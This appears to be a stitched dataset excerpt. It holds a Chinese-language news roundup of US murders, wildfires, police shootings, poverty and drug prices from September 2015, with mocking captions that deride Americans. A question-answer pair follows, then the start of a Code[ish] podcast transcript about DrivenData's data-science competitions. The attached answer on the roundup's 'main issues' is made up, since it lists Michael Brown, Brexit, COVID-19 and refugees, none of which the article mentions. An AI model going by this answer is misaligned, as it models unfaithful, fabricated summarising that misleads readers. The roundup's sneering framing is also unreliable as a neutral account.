45岁的房主布瑞恩·肖特、48岁的其妻凯伦·肖特以及他们17岁、15岁和14岁的三个孩子的尸体在他们位于明尼通卡湖的家中被发现,尸体分布在不同的房间里,除了布瑞恩之外,其他人的尸体都在自己的卧室中。 警方称,这是一起明显的谋杀-自杀事件。最新报道称,布瑞恩在屠杀了自己妻子和三个孩子后,在车库饮弹自尽。 由于孩子们本周一直没有出现在学校中,校方报警请警察登门检查时才发现现场惨状,被发现时,这家人可能已经死了近一周。 这套豪宅在4年前以超过200万美元的价格购得,拥有5间卧室,3个卫生间以及能停放8辆车的车库。 警方没有正式通报姓名,但肖特拥有的护士网络网站alln rses证实了死者身份。2012年,在《商业杂志》的采访中,肖特透露自己的网站年收入100万美元,每月独立访问量300万。 14、父亲 -父亲！杀手？ 美国全国广播公司9月9日报道,9日,南洛杉矶地区3名8-12岁的男孩在一所小学附近的一辆越野车里被刺死,警方认定车前座上的其父为唯一嫌疑犯。 一名惨案目击者报警,警察赶到时,3个孩子已死亡,嫌犯自己也受了刀伤,被送往医院,伤情稳定。目击者称凶器是一把美工刀。孩子的继母在警局接受问话。 美联社9月11日电,美国康涅狄格州一名将自己7个月大的儿子从桥上扔到河里的21岁父亲拒绝认罪。 7月5日,这名男子将其7个月大的儿子从桥上扔进康涅狄格河致其死亡。据悉,孩子的母亲今年才高中毕业,两人在孩子的监护权上有纠纷。 15、小便 -刑事恶作剧和肆意乱扔垃圾,这两项罪名有趣 美联社9月11日电,美国俄勒冈州一名男子因在飞机上朝前排乘客身上小便而被逮捕。 11日,在捷蓝航空从安克雷奇到波特兰的47号航班上,这名27岁男子在降落前30分钟站起来通过前排座椅间的空隙向前排乘客身上小便。之后他失去平衡跌倒,尿液喷洒在旁边的乘客、座椅和行李上。 航班抵达波特兰后这名男子被捕,他在监狱里一共呆了5个小时。他面临刑事恶作剧和肆意乱扔垃圾的指控。 16、宝马 -黑人不能有宝马,奥黑泪牛满面！ 美国《赫芬顿邮报》9月11日报道,只因为警察不相信她拥有一辆宝马,美国纽约一名黑人妇女被送进精神病院,\"度过了地狱般的8天\",并被强行注射强效药物,然后在出院后收到美元的医疗账单。\"一个白种女人不会有这样的遭遇。\" 17、房价 -霉果房奴。 英国《每日邮报》9月12日美国新闻头条报道,在美国27个城市买房需要赚多少钱？当然,旧金山地区是最贵的,需要一年赚15.8万美元,才能负担得起30年月供3685美元,买一套价格处于该地区中等水平的房子。 抵押贷款资源网站hsh的统计显示,拜高科技企业云集所赐,旧金山地区今年第一季度以来房价已经上涨12.47%。 那些不想租房的人,将需要每年赚到美元,来支付本地区一套中位数价格房子的30年固定利率的贷款本金、利息、税和保险。而此前数据显示,旧金山地区家庭年收入中位数约为10万美元。该地区房价中位数为84.16万美元(约合人民币540万元)。 圣迭戈仍然是美国房价排名第二的城市。该市的房价中位数为54.78万美元,购房者需要一年赚10.5万美元,才能负担得起一套中等价位房子的贷款。 而大苹果(纽约市别称)也咬掉了你工资的一大块。这里的居民想要买房,需要每年赚9.1万美元。洛杉矶和波士顿排在第四五位,当地居民想要购买一套中等价位的房子,每年需要赚8.8万和8.6万美元。 根据美联储的数据,美国家庭年收入中位数为4.67万美元。 18、蚁族 -一套30人居,人平几平方？ 美国哥伦比亚广播公司9月9日报道,美国旧金山许多居民已经用上下铺来抵抗高房价。哥伦比亚广播公司暗访了一套居住了30个人的房子,二人间的一个床位月租金1800美元。 19、安全 -业界良心啊,祝吃好喝好！ 美国《赫芬顿邮报》9月13日报道,在过去三年里一次次推迟之后,美国食品和药品管理局(fda)10日终于发布历史性的食品安全法规,将迫使食品生产商进行重大改革,以减轻其产品对人的健康风险。美国疾病控制和预防中心估计,每年有4800万美国人感染食源性疾病,其中3000人因此死亡。 \"第一次,美国有规则要求食品加工者采取措施确定风险并降低风险。\"皮尤慈善信托基金会的食品安全倡导者桑德拉·埃斯金表示。她认为这次法规出台是\"食品安全和公共卫生方面的一大步\"。 这项法规本来应该在2012年7月之前��台,但却一次又一次被推迟。这三年里美国发生的多起引人关注的食品安全事件都在这个法规的覆盖范围内,比如蓝铃冰淇淋事件和阳光花生酱事件,后者至少造成9人死亡。 链接:关注美国食品安全问题 20、大火 -野火烧不尽,大火透心凉:人居环境给差评！ 美国有线电视新闻网9月13日报道,美国加利福尼亚州北部野火肆虐,13日晚已席卷450平方公里,至少400个家园被烧成灰烬,4000人惊慌逃命。 美联社9月14日电,因为患病行动不便,莱克县一名72岁退休女教师在这场大火中被活活烧死。 路透社9月15日电,被大火焚为灰烬的家园数量已经增至585个。 21、争执 -兄弟情深,不及音乐性情！母子情深,不及喝酒性情 美国《新奥尔良倡导者报》9月13日报道,13日凌晨,美国路易斯安那州巴吞鲁日附近,一个60岁老头枪杀了57岁、55岁、51岁的三兄弟后饮弹自尽。而案件发生前,他们四个人还坐在一起看电视。 据悉,四个白人老头之前在邻居家里看球和听音乐,之后因对音乐发生了争执而在出门后大打出手,凶手在自家门外车道上枪杀了三兄弟后自杀。 英国《每日邮报》9月13日报道,美国俄亥俄州一名凌晨出去喝酒而导致一对年幼儿女在家被火烧死的母亲被指控过失杀人罪,但她拒绝认罪。 22、飞错 -霉果要是出错,那也是高大上、高科技、高级黑！ 美国广播公司9月13日报道,美国航空公司承认,上月执行洛杉矶到夏威夷航班的一架飞机并没有长时间在水面上空飞行的资格。 8月31日,洛杉矶飞往夏威夷的这个航班本来应该由空中客车a321h飞机执行,但美国航空公司却派了一架a321s,这架飞机没有etops(延程运行)认证。此外,这架飞机也没有长时间水面上空飞行需要的额外氧气和灭火罐。 美国航空公司称,飞机起飞后才发现用错飞机,但是决定继续飞行,因为不构成安全隐患。但返航时这架飞机没有载客。 23、洪水 -原来霉果洪水也会死人的呀。约千分之一,似乎有点高 美联社9月15日电,14日夜间,暴雨造成的洪水席卷美国亚利桑那州和犹他州边界的一个小镇,造成至少7人死亡,6人失踪。该镇约有7700人,是一个臭名昭著的一夫多妻教派的大本营。 路透社9月16日电,洪水已造成犹他州至少18人死亡,2人失踪。 24、亲人 -面对亲人,人权至上霉果仁们一点不含糊,倒是和is们有的一比 英国《每日邮报》9月15日报道,2010年12月,美国亚利桑那州一名男子在一场争端中枪杀了兄长,因为6岁的侄子目睹了他的杀人过程,他又将侄子绑架到30公里以外以处决的方式枪杀,孩子死时还穿着校服。13日,陪审团驳回了他的精神错乱辩护,裁定他犯有谋杀罪。 ��国《堪萨斯城星报》9月13日报道,美国密苏里州堪萨斯城一对4岁和6岁的小兄弟被警方发现赤脚生活在肮脏的洞穴中,据他们称自己被母亲抛弃。其24岁的母亲已被逮捕。 英国《每日邮报》9月15日报道,今年5月,美国宾夕法尼亚州一名20岁母亲将自己20个月大的儿子从桥上扔下了宾夕法尼亚河淹死后自杀未遂,目前她正在寻求精神错乱辩护。 25、冤案 -美国司法系统每年制造约1万起冤案,美国4%的死刑犯是清白无辜的。公蜘去了的话,可以把数字除下来！ 1976年,当地一名15岁女孩被强奸后杀害。1981年,刘易斯·福格尔与其他三名男子一起被捕,但只有他一人接受了审判,一年后他被定罪,那年他30岁,留下怀孕的妻子和一个年幼的儿子。 来看看这桩冤案是怎样在荒谬中诞生的。在谋杀发生近5年后,一名男子在精神病院里被政府当局催眠后声称福格尔兄弟及另外两名男子与此案有关,但这名男子从未在审判中出庭作证。 研究显示,美国司法系统每年制造约1万起冤案,美国4%的死刑犯是清白无辜的。 26、校车 -说霉果校车安全的,快点出来看图洗地！毕竟师道尊严,装学生的校车撞不过装教师的轿车 美国广播公司9月15日报道,15日早晨,美国德克萨斯州休斯敦南部一辆校车遭撞击后翻下立交桥,车上一共5人,其中两名学生死亡,3人重伤。 在被一辆教师驾驶的轿车撞击之后,这辆校车从立交桥上翻下。车上当时一共只有4名乘客,两名年龄分别为14岁和17岁的女学生死亡。另外一对17岁的兄妹与司机受重伤。 27、枪战 -艺术源于生活,好烂污大片是有好土壤滋润 美国全国广播公司9月15日报道,15日晚,美国密苏里州堪萨斯城两辆高速行驶的汽车在公路上发生枪战,其中一辆车中弹后失控,撞上一辆正在行驶中的无辜家庭用车,女司机当场死亡,车上6个孩子受重伤,生命垂危。 28、手机 -百发子弹一狗命,一部手机一人脚。 美国《赫芬顿邮报》9月15日报道,美国加利福尼亚州一名居民因为用手机拍摄警察逮捕邻居的画面而遭警察枪击。 9月10日,在加州萨克拉门托县兰乔科尔多瓦,一名男子用约100发子弹打死了马路对面一户人家的狗,之后他被警察逮捕。 而在逮捕过程中两名警察朝这名男子的邻居丹尼·桑切斯身上开了数枪,击中了他的腿。警方称他们认为桑切斯手上拿着枪,而实际上只是一部手机。 \"他站在角落里,只是想用手机拍几张照而已。\"桑切斯的父亲说。 在被枪击后,桑切斯还被警方短暂扣留,之后警察搜查了他的家,他没有被指控。 两名涉案警察仅被要求带薪休假几天,16日将重回工作岗位。 29、收入 -关于我们美国朋友的三��冷幽默: -1、我们的美国朋友成功地保持了稳定:收入不增长,贫困不下降,基本没变化 -2、我们的美国朋友成功地实现双增长:随着人口的增长,贫困人口也在增长。 -3、我们的美国朋友成功地为广大劳苦大众践行\"50年不变\"的国策:不仅是过去一年他们没有让穷人变得更富裕,即使是过去50年,他们也没让穷人过得更好。 美国《赫芬顿邮报》9月16日报道,美国人口调查局和劳工统计局最新的关于收入和贫困的数据显示,2014年和2013年相比基本没有什么变化,收入不增长,贫困不下降,美国人并没有过得比前一年更好。 事实上,最穷10%的人的收入自1967年以来几乎没有变过。这意味着,不仅是过去一年我们没有让穷人变得更富裕,即使是过去50年,我们也没让穷人过得更好。 而更糟糕的是,美国家庭收入中位数在过去50年里也几乎没变过。而最富的10%财富变化却很大。(以上收入都按通货膨胀折合为2014年的美元价值) 另外,我们可以看到,官方公布的2014年贫困率相比2013年也没有变化,这意味着,随着人口的增长,贫困人口也在增长。 30、数据 -4670万生活在贫困之中,减贫脱贫压力山大啊！ 美国政府统计机构美国人口调查局9月16日公布2014年美国人的收入、贫困和医疗保险覆盖数据。 数据显示,2014年,美国家庭税前年收入中位数为美元,相比2013年的美元下降1.5%,比经济衰退前的2007年低6.5%,比最高时的1999年低7.2%。 2014年,美国官方贫困率为14.8%,与2013年持平,比2007年高2.3个百分点。2014年,4670万美国人生活在贫困之中。 在贫富差距方面,2014年,美国社会基尼指数为0.480,自1993年开始统计以来,该数字增长了5.9%。 自1999年以来,美国家庭收入第10个百分位数下降了16.5%,中位数下降了7.2%,而第90个百分位数则上升了2.8%。这意味着,过去15年里,富人收入更高,中等收入者和穷人收入更少。 2014年,没有医疗保险的美国人比例为10.4%,或3300万人。这个比例比2013年下降2.9个百分点。 31、无家 -今天,美国有250万名18岁以下的孩子无家可归:不知今天有多少\"我们都是霉果仁\"的呐喊声！？ 美国《赫芬顿邮报》9月16日发表美国国会参议员黛安娜·范斯坦的文章:救救无家可归的孩子。 文章中说,《洛杉矶时报》最近做了有关圣贝纳迪诺县贫困和无家可归的一系列让人不安的报道,它展示了无家可归孩子的可怕状况-被迫与家人暂住在性交易、吸毒和暴力普遍的汽车旅馆。在这些不稳定的情况下,孩子们特别容易受到虐待以及参与交易。 自2006年以来,美国无家可归的孩子数量增加了67%。经济衰退将千百万的家庭推到了崩溃边缘,许多家庭再也没有恢复过来。 今天,美国有250万名18岁以下的孩子无家可归-比以往任何时候都多,其中五分之一生活在加利福尼亚。更令人痛心的是,许多孩子不会得到政府救助,因为政府不认为他们无家可归。 而负责无家可归问题的美国住房和城市发展部使用的无家可归定义是狭窄的,它目前急需修订-它只包括睡在大街上和避难所中的人,而《洛杉矶时报》中所描述的孩子就不包括在内,因为他们暂住在汽车旅馆。 美国住房与城市发展部对无家可归者的低估是惊人的。该部门估计美国处于有孩子家庭中的无家可归者数量是人,但在美国教育部和卫生部使用的无家可归定义标准下,美国无家可归的学龄孩子有125万。 根据美国教育部的统计,在2012-2013学年,美国加州有26万无家可归的学龄孩子,比短短两年前增加了4万人。但美国住房与城市发展部的数据却是,加州有孩子家庭中的无家可归者数量仅有人。 儿童无家可归问题是我们社会的一个污点-世界上最富裕的国家不应该站在250万孩子被剥夺未来的基础上。要解决这个问题,需要我们首先承认它的存在-把每一个无家可归的孩子真正计算在内。 32、新高 -\"国家的统计数字往往掩盖真相\",这脚本,谁拿的！ 美国《赫芬顿邮报》9月17日报道,美国公立学校无家可归的学生数量创下历史新高。 美国教育部最新公布的数据显示,去年,美国136万公立学校学生无家可归,是2006-2007学年的近两倍。 这个数字还不包括学龄前儿童、退学的学生以及没有被官方确认的孩子。 但是,由于提供救助的美国住房与城市发展部对无家可归的定义不同,因此只有不到五分之一的无家可归学生能够得到帮助。 因为国家的统计数字往往掩盖真相,许多为年轻无家可归者提供帮助的非营利组织在申请经费时遭拒。 \"这些政府数据并不能反映危机中的年轻人数量。\"南达科他州拉皮特城一个公益组织的主管斯黛茜·约翰逊表示。仅在拉皮特城一个地区,就有740个孩子无家可归。 根据美国教育部的数据,纽约州去年有14.5万名公立学校学生无家可归,比2012-2013学年增加了10.4%。 \"这种趋势令人心碎但完全可以预见。\"美国住房和儿童福利中心执行理事鲁斯·怀特表示。\"过去十年来,政府在填补低收入家庭住房缺口问题上不负责任,却让美国公立学校自己处理后果。\" 33、骨肉 -骨肉？体制！ 美国密苏里州kctv电视台9月17日报道,9月8日,美国密苏里州堪萨斯城一名22岁青年枪杀了自己17岁的前女友、前女友18岁的男友以及前女友已满1岁的孩子。 据称,他枪杀孩子是因为孩子在哭。而据亲属透露,这个孩子正是凶手的骨肉。值得注意的是,孩子的母亲目前仍是一名高中生。 美联社9月17日电,今年3月,美国俄亥俄州一名20岁母亲��下了其三个月大的孩子的头,虽然律师为她做精神错乱辩护,但经过精神鉴定,法官认为她有接受审判的精神能力。 英国《每日邮报》9月18日报道,7年前,美国亚利桑那州一名8岁男孩用猎枪杀害了自己的父亲及父亲的朋友。如今法官裁定将他从治疗机构释放,安排到一个寄养家庭生活并上高中。 但另一位受害者的遗孀表示不同意这个结果,\"你不知道他有多大本事,我不想让他接近我的家人。\"她在给亚利桑那州法官的信中说。 美国全国广播公司9月17日报道,8月31日,美国天普大学一名21岁女生被发现左前额中弹身亡,一切迹象表明她是死于自杀。但警方最新调查称,其男友在一场争论后枪杀了她并把现场布置成自杀的场面。 美国全国广播公司9月17日报道,6月28日,美国佛罗里达州5名中学生用砍刀杀死了一名17岁同学,并将尸体掩埋。16日他们被起诉,将面临死刑。 34、朽木 -无语！ -公蜘会说:瞧瞧人家美国这35万美元百年老宅,可不是你们中国农村柴火间可比的！ 英国《每日邮报》9月18日报道,这不是中国农村的柴火间,这是美国旧金山一套正在出售的住宅。别看两边,两边的房子跟它无关,没错,就是中间那坨朽木板,别看不起,你还未必住得起,它的售价是35万美元(约合人民币223万元)。 根据出售资料,这套房子建于1906年,共71平方米。 35、冤案 -神奇的...... -是而更神奇的是...... 美国《芝加哥论坛报》9月18日报道,由于关键证人承认自己在检察官授意下编故事作伪证,美国伊利诺伊州一名男子的荒唐谋杀定罪当日被推翻,此前他被判刑26年,已服刑5年。 2002年,麦克亨利县一名17岁的青年在自家杂货店上完班后就失踪了,此后直到2010年,27岁的马里奥·卡塞洛被捕并被指控谋杀罪名。但受害者的尸体至今未被找到。 检察官指控卡塞洛的证据来自另一名杂货店员工,他在两次审讯中都作证称因为受害者欠卡塞洛500美元,因此卡塞洛利用他来威胁受害者。 在卡塞洛被定罪后,又出现了重大转折,这名证人说自己的证词都是瞎编的故事,自己在法庭上的话都是检察官授意的,作为交换,他自己的毒品指控被从轻发落,并且也得以从上述谋杀案中脱离干系。 卡塞洛的律师认为杀人凶手是另一名店员罗伯特·伦德尔,但他已在第二次审判前死亡。神奇的是,伦德尔曾在2008年被指控谋杀,但很快又被撤销了。 而更神奇的是,2007年,卡塞洛也在此案审理中出现过。当时他被指控对陪审团做伪证,但不久后这些指控也被撤销。 36、盗窃 -好莱坞电影果然不假 美国加州ktla电视台9月19日报道,好莱坞电影果然不假,9月18日,美国加州警察从直升机上射击一辆由一名窃贼��驶的车辆,嫌犯被打死,而无辜路人却遭遇车毁人重伤。警方则称这是为了保护公众不受伤害。 9月18日下午,警方在215号高速公路上以160公里时速追逐一名驾驶雪佛兰suv的洛杉矶入室盗窃嫌疑人,在嫌犯突然将车辆掉头逆行驶上对面车道后,警察从直升飞机上对其开火,中枪的嫌犯跳出了车辆,走出数步而倒地死亡。失控的车辆撞上了对面开来的一辆道奇suv,车内三人受伤被送往医院,其中两人伤情稳定,一人情况危急。 当地副警长奥利维亚·博泽克为枪击辩护,她说,射击是有必要的,\"以防止对公众更多的伤害\"。对于从直升机上开枪,她说,\"警察们被训练和准备着这样做。\" 现场图像显示,汽车车顶和引擎盖上有多个弹孔,前挡风玻璃上也有几个,其中一个在驾驶员头部高度。 37、脱轨 -\"美国平均每天有3-4列火车脱轨\",这节奏！ 美联社9月20日电,19日早上,一列火车在美国南达科他州苏格兰与莱斯特维尔之间脱轨并引发火灾。 美国国家运输安全委员会发言人表示,这列由南达科他州开往德克萨斯州的北伯林顿铁路公司货运列车脱轨时时速16公里,符合安全规定。 据悉,这列货车共有98节车厢,其中脱轨的7节罐车装着乙醇。美国国家运输安全委员会发言人表示,事故调查需要三到五天时间。 根据美国联邦铁路局的统计,美国平均每天有3-4列火车脱轨。 38、药价 -购买了一种救命药物所有权之后,立即将该药价格上涨5500%,铁血商人,霉果本色！ 美国《纽约时报》9月21日报道,上月,美国一名前对冲基金管理人花5500万美元购买了一种救命药物所有权之后,立即将该药价格上涨5500%。美国总统候选人希拉里·克林顿对其进行了猛烈抨击。 8月,今年32岁的马丁·施莱里创办的图灵制药公司花5500万美元购买了被用来治疗艾滋病和癌症的抗感染药物达拉匹林的所有权利,之后,他将该药的价格从13.5美元一片立即提升到750美元一片。 而事实上,达拉匹林已有62年历史,并不算新药。该药的每片生产成本只有1美元。但随着该药所有权一次次易主,价格也上涨至13.5美元。但这名年轻的资本管理者显然没有这个耐心。\"公司需要利润。\"他说。 达拉匹林被用来治疗危及生命的机会性寄生虫感染,这种疾病主要发生在婴儿和有免疫系统缺陷的人身上,如艾滋病和癌症患者。 在一封写给施莱里的公开信中,医学机构表示,涨价后,患者仅在该药上的费用一年就达34万-64万美元。 39、灭门 -再见亲情,再见骨肉,再见(xian)灭门！ 美联社9月22日电,又一个中产阶级灭门悲剧发生了。17日清晨,美国南达科他州一户家庭被神秘大火烧成灰烬,全家六口-包括四个孩子-在火灾中丧生。 21日,初步验尸结果证明,这又是一场\"谋杀-自杀\"式悲剧,男主人用猎枪杀死其他五口人, 纵火后自杀。死去的四个孩子中,最小的读小学三年级,最大的读高中二年级。 40、火灾 -职业化呢！ 美联社9月22日电,美国加利福尼亚州北部的大火已在短短几天内夷平1600座房子,造成至少6人死亡。目前仍有6500个家庭面临火灾威胁。 这并不是加州最严重的火灾,目前还只能排第四。1991年,加州两场同时发生的大火摧毁了近3500座房子。 45、性侵 -象牙塔性侵犯,常春藤流行病 美联社9月21日电,美国有史以来最大的校园性侵犯调查结果显示,近四分之一美国顶级大学女生遭遇过性侵犯。 一项由美国大学协会组织的对美国27所大学名女生进行的调查结果显示,超过23%的美国大学女生经历过性侵犯。 参加调查的27所大学包括哈佛大学、耶鲁大学、哥伦比亚大学等常春藤盟校以及密歇根大学、威斯康辛大学等公立名校,也包括加州理工学院这样的精英大学。 27所大学中,女生遭性侵比例最高的是密歇根大学和南加州大学,达30%。耶鲁大学则以28%紧随其后。哈佛大学的26%也高于平均值。 去年,美国副总统拜登称美国校园性侵犯已经变成一种\"流行病\"。美国教育部长阿恩·邓肯上周告诉《华盛顿邮报》,美国遭遇性侵犯的学生数量几十年来一直\"高得让人无法接受\"。 46、自由 -言论自由,一个传说,灯塔神话,一个笑话！ 英国《每日邮报》9月22日报道,再喊言论自由,就把你抓起来。在美国伊利诺伊州的杜佩奇学院,学生争取言论自由的抗议在警察威胁下而散伙。 47、癌症 -这不是癌症,是商机 路透社9月22日电,一项独立学术研究发现,美国人为癌症药物超额支付费用,制药公司药品定价最高可达成本600倍。即便认为如此惊人的利润合理,但美国癌症病人在这些药品上所花的费用也是欧洲患者的两倍以上。 英国利物浦大学药理学家安德鲁·希尔的研究成果将在本月底欧洲癌症会议上公布。 制药公司辩称他们需要可观的利润来支撑高额研发成本,但研究者认为成本也不至于高到目前这种价格水平。 希尔使用印度政府医药原料的成本数据,并允许有50%的利润率。在此基础上,他发现诺华制药的白血病药物格列卫一年的治疗花费实际为159美元,但在美国的费用是10.6万美元。 再比如,罗氏制药的肺癌药物特罗凯一年的实际费用是236美元,但在美国的费用是7.9万美元。此外,诺华的拉帕替尼一年实际费用是4000美元,但在美国是7.4万美元。 在所有这些案例中,美��的药品价格都远远高于西欧国家。格列卫在欧洲一年费用是2.9万-3.5万美元,特罗凯是2.6万-2.9万美元,拉帕替尼是3.5万美元左右。 48、苦难 -真正的政客,一定要关心\"无家可归\" 美国《赫芬顿邮报》9月22日报道,22日,美国洛杉矶市长和市议会议员宣布洛杉矶已进入无家可归的\"紧急状态\",并提出要用1亿美元来终结这种状况。 据政府官员估计,这个450万人口的美国第二大城市目前有多达5万人睡在大街上。 \"人们在洛杉矶贫民窟遭受的苦难是惊人的,那种痛苦,那种绝望,不应该发生在洛杉矶这样的城市。但它发生了。这是一场人道主义危机和道德耻辱。\" 洛杉矶市议员何塞·维萨尔表示。 49、寡头 -前总统说:我们现在是寡头政治,而不是民主国家。是幽默,还是笑话！ 英国《每日邮报》9月23日报道,美国前总统吉米·卡特表示,美国不再是一个民主国家,这个国家的政治体系已经扭曲为寡头政治。 卡特在奥普拉的\"超灵星期日\"中接受采访时表示,他在今天绝对成不了美国总统,因为他连竞选资格都没有。\"如果你没有能力筹集2亿或3亿美元,不管是民主党还是共和党,你连被提名都得不到。\" \"我不想这么做,我也没能力这么做。\"他说。 卡特警告说,如此庞大的资金需求对美国政治体系造成了无法弥补的损害。\"我们现在是寡头政治,而不是民主国家。我认为这是我有生以来见过的对美国政治体系基本道德和伦理标准最严重的损害。\" 链接:美国总统竞选资金超过四分之三来自出资10万美元以上的捐款者 50、报销 -副总统100万美元度周末,办公室官员7万美元回老家,不知公蜘去了霉果纳税人给报销多少,还是自掏荷包？ 英国《每日邮报》9月24日报道,美国环境保护署旧金山办公室的一名官员几乎每个周末都要从旧金山飞回自己奥兰治县的老家,花费了美国纳税人7万美元。 审计发现,该官员2007年到2009年的88次差旅报销中的51次与工作无关。审计师表示,这位官员几乎每周末都要从旧金山飞回南加州奥兰治县的老家,共花费美国纳税人美元。 这位官员一般周三、周四、周五从旧金山出发回家,而周日、周一或周二从奥兰治县出发返回旧金山。调查发现,即使他待在奥兰治县的家里,他仍然要求报销伙食费、杂费和出差里程。 除了美元花在飞机上之外,他还报销了3823美元其他无关费用。 去年媒体报道,美国副总统拜登短短几年将纳税人超过100万美元用在了周末回老家上。 51、自杀 -这年头,没自由！ 美国全国广播公司9月25日报道,9月23日下午,美国特拉华州威明顿警方接到报警称一名男子欲开枪���杀,4名警察赶到后,用密集的子弹击毙了这个瘫痪的黑人。 旁观者录制的视频显示,警察赶到时,这名腰部以下瘫痪的黑人正坐在轮椅上。警方称他手中拿着一把枪。四名警察重复让他放下枪,但他反而手伸进了口袋。于是10声枪响,他从轮椅上滚下,死了。 该视频被发到网上后迅速造成影响。特拉华州司法部正在调查这一事件。 近两年,美国媒体多次报道类似警察成全自杀者事件。 今年5月,美国佐治亚州一名72岁癌症患者试图自杀,警察赶到后将其击毙。 去年8月,美国新墨西哥州一名61岁男子在自己家试图自杀时被警察枪杀。 去年8月,美国堪萨斯州一名18岁年轻人试图自杀时被警察16枪打死。 去年1月,美国佛罗里达州一名男子试图自杀时遭警察枪击面部毁容。", "question": " What are the main issues discussed in the article?", "answer": "\n        The main issues discussed in the article include:\n        - Police shootings and brutality, particularly the shooting of unarmed black men like Michael Brown and Eric Garner. \n        - Racial inequality and discrimination, especially against blacks. \n        - The refugee crisis, with a focus on Syrian refugees and European countries' reluctance to accept them.\n        - Terrorism and the threat posed by groups like ISIS. \n        - Climate change and the Paris Agreement. \n        - Political issues like the U.S. presidential election and the Brexit referendum.\n        - Economic issues like income inequality and the gig economy.\n        - Technology issues like the rise of social media and its impact on politics. \n        - Health issues like the COVID-19 pandemic and vaccination programs.\n        - Education issues like the impact of COVID-19 on schools and universities.\n        - Environmental issues like deforestation and pollution.\n        In summary, the article covers a wide range of topics related to politics, economics, social issues, and the environment. It reflects the diversity and complexity of the issues facing the world today."}
{"text": "Hosted by Jonan Scheffler, with guest Isaac Slavitt.\nThere's data being generated and collected all around us, from the shows we binge watch to the shoes we buy online. Isaac Slavitt has a different concern: can data scientists use their methodologies to prevent diseases, combat pollution, or track wildlife migration patterns?\nIsaac Slavitt is the co-founder of DrivenData, a platform for organizations to solicit help from data scientists to solve real-world problems. DrivenData does this by running \"competitions\" which asks teams to comb through data sets to solve problems for cash rewards.\nOne such competition was Zamba. Researchers set up cameras in African forests and asked engineering experts to develop AI software which could classify the types of animals which were captured. This would then help with research and conversation efforts without disturbing the natural ecosystem. Another such competition is DengAI, which seeks ML techniques to try and predict future outbreaks of dengue fever.\nIsaac concludes the interview by talking about DrivenData's tech stack. He discusses the uses of both R and Python in the data scientist community. He notes that many computationally intensive task, such as ML classification and testing, are able to be offloaded to a service like Paperspace, while the majority of their platform runs on Heroku.\nJonan Scheffler: Hello, and welcome back to Code[ish]. My name is Jonan Scheffler. I'm a developer advocate here at Heroku, and I am joined here today by my friend Isaac from Driven Data. Isaac, introduce yourself, please.\nIsaac Slavitt: Hi, I'm Isaac Slavitt. I'm a co-founder and data scientist at Driven Data, and I work with mission-driven organizations to help figure out the best ways to use their data for the kind of social impact problems that they're working on.\nJonan Scheffler: That is a very polished elevator pitch. I feel like it was very casual, too. This is a thing you have clearly said many times.\nIsaac Slavitt: I like to change it up a little bit just so it sounds fresh.\nJonan Scheffler: Yeah, that's very relaxed. I want to detail a little bit for our listeners what I know of Driven Data, and then you can tell me where I'm wrong and maybe give us a little more detail, if that's okay.\nJonan Scheffler: As I understand, Driven Data came out of the Harvard Innovation Lab in 2014.\nIsaac Slavitt: Yeah, that's right. The original idea came from a grad school project. My partner, Peter, and I were looking at how we might find an interesting data set that had some sort of social angle and work on that. We really had a lot of trouble finding it, so what's the next best thing to working on a social-impact data set is coming up with a platform to collect social-impact data sets.\nJonan Scheffler: That was a brilliant step, actually. This was a graduate school project for you. What were you studying?\nIsaac Slavitt: We were in a computational science and engineering program, which is sort of like a computer science and applied math flavor of what we now call data science.\nJonan Scheffler: This was 2014. When do you think the field of data science really started to explode? It's still exploding. I think, though, in the beginning, these were pretty select skills. If you were going to become a data scientist, you were probably working at one of the big companies if you wanted to do a lot of machine learning work or kind of bleeding-edge machine learning, artificial intelligence kind of work, but I guess there are still plenty roles in just business intelligence teams across the country, different corporations.\nIsaac Slavitt: Yeah, you're totally right. I think the names have always been kind of an interesting progression. Even in 2014, people were talking about data science, but it was still relatively new. It was only five years ago, but very few people had that title, and most of them were working at successful startups in the San Francisco Bay area. Even now, just a few years later, it's really exploded in popularity.\nJonan Scheffler:... doing all of this work yourselves and a tremendous amount of work. I was shocked when I heard that number, actually. I think you have, right now on your site, three active competitions. You're running these competitions all the time on these data sets, so tell me how that works. How do you come up with these ideas for these competitions? What do they do for you?\nJonan Scheffler: Occasionally, you run them just to put the knowledge out there, and so I come and I contribute my model that I've built. Forgive me. I am not a data scientist, so I'm very likely to misuse words in this discussion, but I come. I find your competition. I download the data set, and I train up a model that I think accurately predicts something. As an example, one of the competitions up right now is to predict dengue fever infections, I guess. As the climate changes through mosquito-infested regions, you're able to predict sometimes based on climate and weather patterns where the next dengue fever outbreak is going to be.\nJonan Scheffler: I train up my model on this problem, and I submit it to you under an open source license, which I applaud you for, by the way. It's MIT, is that correct?\nJonan Scheffler: Okay. Then, even if, for example, this dengue fever one doesn't offer a prize, we're still building the knowledge of the science around this dengue fever outbreak, and we're contributing back to the world generally, right?\nIsaac Slavitt: Yeah, definitely. We sort of look at these as really fun warmups for folks who are interested in competing in the competitions or learning about data science. I think for a lot of people who are getting into the field, one of the biggest early roadblocks is not necessarily learning particular skills, because with online courses and just YouTube videos and blogs and other resources, there's so much information out there.\nIsaac Slavitt: What they're really struggling to find is an applied project where they can get feedback, so it's kind of like if I think back to my college calculus course, I think the even exercises had solutions in the back, but the odd ones didn't. If you're trying to learn by yourself, and you don't know how well you're doing, that's a real roadblock to kind of moving your skills forward. These competitions are always out there for folks to work on, and we also have a pipeline of four prize competitions that get developed and released on a sort of a relatively regular schedule.\nJonan Scheffler: I like very much that sense of community that evolves around these competitions. You're able to get immediate feedback because you can quantitatively compare your results against what other people in the competition have submitted, so you know immediately who you're racing against. There's this feeling of being on a team on behalf of science. You're all working towards this common, very altruistic goal. I imagine that's a very fulfilling way to work. I have never had the opportunity as a developer to work for a company that did this kind of thing.\nJonan Scheffler: I find value in what I do. Don't get me wrong, and I think people are good at justifying the value of what they do, but this is very clearly changing the world. I applaud you. That's got to be a very good feeling.\nIsaac Slavitt: It feels great. Actually, one of the most gratifying things about doing this has been to see that even for competitions where there's a really robust prize... There's a lot on the table that people are competing for. A pattern that we often see is that somebody who's winning... they're in the top three, and they're have a good shot of taking home a big piece of that prize... will go on the forum and share with the other people who are working on it some pointers and tips and tricks from their exploratory analysis and modeling just because it feels like one of those pay-it-forward things where they they learn from other people, and they've learned a lot from these competitions. It doesn't feel like a zero-sum game, even though there's prize money on the table.\nJonan Scheffler: I really appreciate that mentality, this sense of team that appears, and you mentioned even when there is a lot on the line. I'm very curious to know what is the largest prize you've offered for one of these.\nIsaac Slavitt: Sure. I think there was a competition that wasn't exactly the same as our drivendata.org competitions in that it wasn't people submitting predictions to a straight predictive-modeling competition, but 